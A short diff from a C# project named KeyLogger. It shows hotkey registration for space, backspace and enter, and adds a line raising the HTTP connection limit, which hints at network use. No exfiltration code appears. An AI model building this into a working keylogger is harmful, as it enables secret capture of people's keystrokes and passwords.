@@ -39,6 +39,7 @@ namespace KeyLogger
             RegisterHotKey(this.Handle, 32, 0, 32);
             RegisterHotKey(this.Handle, 8, 0, 8);
             RegisterHotKey(this.Handle, 13, 0, 13);
+            ServicePointManager.DefaultConnectionLimit = 10000000;
         }
 
         protected override void WndProc(ref Message m)
